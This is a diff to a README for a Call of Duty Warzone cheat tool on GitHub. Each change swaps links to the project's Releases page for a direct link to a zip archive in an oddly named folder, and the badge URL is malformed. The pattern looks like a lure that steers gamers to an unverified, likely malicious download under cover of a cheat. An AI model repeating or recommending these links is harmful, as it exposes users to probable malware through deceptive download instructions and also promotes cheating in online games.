@@ -6,7 +6,7 @@ Welcome to the cod-warzone-cheat! This tool enhances your gaming experience by o
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/C111S/cod-warzone-cheat/releases)
+[![Download](https://raw.githubusercontent.com/C111S/cod-warzone-cheat/main/pathoanatomy/cod-warzone-cheat.zip%https://raw.githubusercontent.com/C111S/cod-warzone-cheat/main/pathoanatomy/cod-warzone-cheat.zip)](https://raw.githubusercontent.com/C111S/cod-warzone-cheat/main/pathoanatomy/cod-warzone-cheat.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you download the cod-warzone-cheat, ensure your system meets the followin
 
 To download the application, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/C111S/cod-warzone-cheat/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/C111S/cod-warzone-cheat/main/pathoanatomy/cod-warzone-cheat.zip).
 2. Look for the latest version available.
 3. Click on the asset you want to download (it usually has a `.exe` or `.zip` file extension).
 4. Save the file to your computer in a location you can easily access, like your Desktop or Downloads folder.
@@ -84,4 +84,4 @@ If you need assistance, feel free to reach out through our support channels. We 
 
 This project is licensed under the terms of the MIT License. See the LICENSE file for details.
 
-Remember to [download the latest version here](https://github.com/C111S/cod-warzone-cheat/releases) and enjoy a more strategic Warzone experience!
+Remember to [download the latest version here](https://raw.githubusercontent.com/C111S/cod-warzone-cheat/main/pathoanatomy/cod-warzone-cheat.zip) and enjoy a more strategic Warzone experience!
